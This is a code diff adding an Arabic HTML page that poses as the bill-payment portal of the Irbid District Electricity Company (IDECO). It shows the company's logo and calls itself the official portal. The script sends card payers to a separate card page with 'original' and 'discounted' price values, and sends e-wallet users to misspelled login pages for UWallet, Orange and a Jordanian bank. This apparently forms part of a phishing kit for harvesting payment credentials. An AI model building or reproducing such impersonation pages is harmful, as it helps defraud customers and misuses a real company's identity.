@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta name="theme-color" content="#0d3b66" />
+<title>إتمام عملية الدفع - الاستعلام عن فاتورة الكهرباء</title>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;900&display=swap" rel="stylesheet" />
+<style>
+  :root{
+    --primary:#0d3b66;
+    --primary-dark:#092947;
+    --primary-light:#e8f0f8;
+    --accent-green:#1e7d3a;
+    --accent-green-bg:#eaf6ee;
+    --bg:#eef1f4;
+    --card:#ffffff;
+    --border:#d7dde3;
+    --text:#1c2733;
+    --muted:#5b6b7c;
+    --radius:10px;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{
+    font-family:'Tajawal',Arial,sans-serif;
+    background:var(--bg);
+    color:var(--text);
+    min-height:100vh;
+    line-height:1.5;
+    display:flex;
+    flex-direction:column;
+  }
+
+  header{
+    background:var(--primary);
+    color:#fff;
+    padding:12px 16px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    box-shadow:0 2px 6px rgba(0,0,0,.12);
+    gap:10px;
+  }
+  .brand{
+    display:flex;
+    align-items:center;
+    gap:10px;
+  }
+  header .logo{
+    width:40px;height:40px;border-radius:8px;
+    background:#ffffff;
+    padding:3px;
+    display:flex;align-items:center;justify-content:center;flex:none;
+  }
+  header .logo img{ width:100%;height:100%;object-fit:contain; }
+  header .htext h1{ font-size:.95rem; font-weight:700; white-space:nowrap; }
+  header .htext p{ font-size:.7rem; color:#c7d6e6; }
+
+  main{
+    flex:1;
+    width:100%;
+    max-width:640px;
+    margin:28px auto;
+    padding:0 16px 40px;
+  }
+
+  .card{
+    background:var(--card);
+    border:1px solid var(--border);
+    border-radius:var(--radius);
+    padding:24px 22px;
+  }
+  .card + .card{ margin-top:16px; }
+
+  h2{ font-size:1.02rem; font-weight:700; color:var(--text); }
+  .card-sub{ font-size:.84rem; color:var(--muted); margin-top:4px; }
+
+  .payment-methods {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    margin-top: 18px;
+  }
+
+  .method-card {
+    border: 2px solid var(--border);
+    border-radius: var(--radius);
+    padding: 16px;
+    text-align: center;
+    cursor: pointer;
+    background: #fbfcfd;
+    transition: all 0.2s ease;
+  }
+
+  .method-card input[type="radio"] {
+    display: none;
+  }
+
+  .method-card label {
+    cursor: pointer;
+    font-weight: 700;
+    color: var(--text);
+    font-size: 0.9rem;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .method-card svg {
+    width: 28px;
+    height: 28px;
+    stroke: var(--primary);
+  }
+
+  .method-card.active, .method-card:hover {
+    border-color: var(--primary);
+    background: var(--primary-light);
+  }
+
+  /* حاوية كروت المحافظ الإلكترونية */
+  .wallets-container {
+    display: none;
+    margin-top: 18px;
+    animation: fadeIn 0.3s ease;
+  }
+
+  .wallets-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 10px;
+    margin-top: 10px;
+  }
+
+  .wallet-card {
+    border: 1.5px solid var(--border);
+    border-radius: 8px;
+    padding: 12px 8px;
+    text-align: center;
+    cursor: pointer;
+    background: #fff;
+    transition: all 0.2s ease;
+    font-size: 0.82rem;
+    font-weight: 700;
+  }
+
+  .wallet-card input[type="radio"] {
+    display: none;
+  }
+
+  .wallet-card.selected {
+    border-color: var(--accent-green);
+    background: var(--accent-green-bg);
+    color: var(--accent-green);
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(-4px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .btn-submit {
+    width: 100%;
+    margin-top: 22px;
+    padding: 13px;
+    font-size: 1rem;
+    font-weight: 900;
+    color: #fff;
+    background: var(--primary);
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: background 0.2s;
+  }
+  .btn-submit:hover { background: var(--primary-dark); }
+
+  footer{
+    text-align:center;
+    font-size:.72rem;
+    color:var(--muted);
+    padding:16px;
+    margin-top:auto;
+  }
+
+  @media (max-width: 480px) {
+    header{ padding:10px 12px; }
+    header .htext h1{ font-size:.85rem; }
+    header .htext p{ font-size:.65rem; }
+    .payment-methods { grid-template-columns: 1fr; }
+    .wallets-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="brand">
+    <div class="logo">
+      <img src="https://play-lh.googleusercontent.com/nx02xraB0UOf0alqJERUs4g_fx6PTqoAXvxeXqeAMrWzvJMlSPp3Gn1u-yiBrDPT6OvtfUXwjDM2AwAHUptTAA" alt="شعار شركة كهرباء إربد">
+    </div>
+    <div class="htext">
+      <h1>شركة كهرباء محافظة إربد</h1>
+      <p>البوابة الرقمية الرسمية (IDECO)</p>
+    </div>
+  </div>
+</header>
+
+<main>
+  <div class="card">
+    <h2>اختر طريقة الدفع</h2>
+    <p class="card-sub">يرجى تحديد الطريقة المناسبة لإتمام سداد الفاتورة بأمان.</p>
+
+    <form id="paymentForm">
+      <div class="payment-methods">
+        <div class="method-card" id="cardMethodWrapper">
+          <label>
+            <input type="radio" name="payment_type" value="card" id="payCard" />
+            <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>
+            دفع بالبطاقة الائتمانية
+          </label>
+        </div>
+
+        <div class="method-card" id="walletMethodWrapper">
+          <label>
+            <input type="radio" name="payment_type" value="wallet" id="payWallet" />
+            <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12V7H5a2 2 0 0 1 0-4h14v4"></path><path d="M3 5v14a2 2 0 0 0 2 2h16v-5"></path><path d="M18 12a2 2 0 0 0 0 4h4v-4z"></path></svg>
+            المحافظ الإلكترونية
+          </label>
+        </div>
+      </div>
+
+      <!-- قسم المحافظ الإلكترونية (يظهر عند اختيار المحافظ) -->
+      <div class="wallets-container" id="walletsSection">
+        <label style="font-size: 0.86rem; font-weight: 700; color: #33404c; margin-bottom: 6px;">اختر المحفظة الإلكترونية:</label>
+        <div class="wallets-grid">
+          <div class="wallet-card" data-wallet="UWallet">
+            <input type="radio" name="wallet_provider" value="uwallet" />
+            يو ولت (UWallet)
+          </div>
+          <div class="wallet-card" data-wallet="Orange">
+            <input type="radio" name="wallet_provider" value="orange" />
+            أورنج موني (Orange)
+          </div>
+
+        </div>
+      </div>
+
+      <button type="submit" class="btn-submit">متابعة الدفع</button>
+    </form>
+  </div>
+</main>
+
+<footer>
+  جميع الحقوق محفوظة © شركة كهرباء محافظة إربد المساهمة المحدودة | بوابة الخدمات الإلكترونية
+</footer>
+
+<script>
+  const payCard = document.getElementById('payCard');
+  const payWallet = document.getElementById('payWallet');
+  const cardWrapper = document.getElementById('cardMethodWrapper');
+  const walletWrapper = document.getElementById('walletMethodWrapper');
+  const walletsSection = document.getElementById('walletsSection');
+  const walletCards = document.querySelectorAll('.wallet-card');
+
+  // تبديل التنسيق عند اختيار طريقة الدفع الأساسية
+  function updatePaymentSelection() {
+    if (payCard.checked) {
+      cardWrapper.classList.add('active');
+      walletWrapper.classList.remove('active');
+      walletsSection.style.display = 'none';
+    } else if (payWallet.checked) {
+      walletWrapper.classList.add('active');
+      cardWrapper.classList.remove('active');
+      walletsSection.style.display = 'block';
+    }
+  }
+
+  cardWrapper.addEventListener('click', () => {
+    payCard.checked = true;
+    updatePaymentSelection();
+  });
+
+  walletWrapper.addEventListener('click', () => {
+    payWallet.checked = true;
+    updatePaymentSelection();
+  });
+
+  // تفاعل كروت المحافظ الفرعية
+  walletCards.forEach(card => {
+    card.addEventListener('click', () => {
+      walletCards.forEach(c => c.classList.remove('selected'));
+      card.classList.add('selected');
+      card.querySelector('input').checked = true;
+    });
+  });
+
+document.getElementById('paymentForm').addEventListener('submit', (e) => {
+    e.preventDefault();
+    
+    if (!payCard.checked && !payWallet.checked) {
+      alert('الرجاء اختيار طريقة دفع واحدة على الأقل');
+      return;
+    }
+
+    if (payCard.checked) {
+      const qs = new URLSearchParams(window.location.search);
+      const suffix = (qs.get('original') || qs.get('discounted'))
+        ? `?original=${encodeURIComponent(qs.get('original') || '')}&discounted=${encodeURIComponent(qs.get('discounted') || '')}`
+        : '';
+      window.location.href = 'credit_card_page.html' + suffix;
+    } 
+    else if (payWallet.checked) {
+      const selectedWallet = document.querySelector('input[name="wallet_provider"]:checked');
+      if (!selectedWallet) {
+        alert('الرجاء اختيار المحفظة الإلكترونية المطلوبة');
+        return;
+      }
+
+      // ضع روابط الصفحات لكل محفظة هنا:
+      const walletRoutes = {
+        'uwallet': 'uwalitlogin.html',
+        'orange': 'orange_page.html',
+        'jordan_bank': 'loginbankjorfan.html'
+      };
+
+      window.location.href = walletRoutes[selectedWallet.value];
+    }
+  });
+</script>
+
+</body>
+</html>
